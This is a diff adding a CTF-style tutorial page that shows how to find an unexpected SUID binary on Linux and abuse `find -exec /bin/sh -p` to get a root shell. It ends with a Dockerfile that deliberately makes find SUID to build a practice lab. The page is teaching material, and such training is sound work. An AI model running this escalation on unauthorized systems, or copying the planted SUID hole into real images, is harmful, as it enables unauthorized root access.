@@ -1,0 +1,67 @@
+---
+title: "Linux privesc: SUID"
+order: 2
+summary: A worked challenge — find an unexpected SUID binary and turn it into a root shell.
+tags: [linux, privesc, suid]
+---
+
+import Callout from '../../../components/Callout.astro';
+
+A classic CTF privesc: you land as a low-privilege user and need root to read
+the flag. SUID binaries are the first place to look.
+
+## Background
+
+A **SUID** ("set user ID") binary runs with the privileges of its *owner*, not
+the user who launched it. When that owner is `root`, an exploitable binary
+becomes a root shell.
+
+## Enumerate
+
+```bash title="Find SUID binaries"
+find / -perm -4000 2>/dev/null
+```
+
+- `-perm -4000` matches files whose bits *include* the SUID bit.
+- `2>/dev/null` hides the `Permission denied` noise.
+
+Expected binaries (`passwd`, `mount`, `sudo`) are fine. Look for the odd one
+out — something that can spawn a shell:
+
+```ansi title="Example results"
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/find
+```
+
+`find` shouldn't be SUID. Per [GTFOBins](https://gtfobins.github.io/), a SUID
+`find` runs commands via `-exec`.
+
+## Exploit
+
+```bash title="SUID find → root shell"
+find . -exec /bin/sh -p \; -quit
+```
+
+The `-p` flag keeps the elevated privileges instead of dropping them. Confirm
+and grab the flag:
+
+```bash
+id
+cat /root/flag.txt
+```
+
+<Callout type="warning" title="Authorized use only">
+  Practice this on a throwaway VM or a CTF box you're authorized to use — never
+  on systems you don't own.
+</Callout>
+
+## Build it yourself
+
+```dockerfile title="Dockerfile"
+FROM debian:stable-slim
+RUN useradd -m student && echo 'redsec{suid_is_a_privilege}' > /root/flag.txt \
+ && chmod 600 /root/flag.txt && chmod u+s /usr/bin/find
+USER student
+CMD ["/bin/bash"]
+```
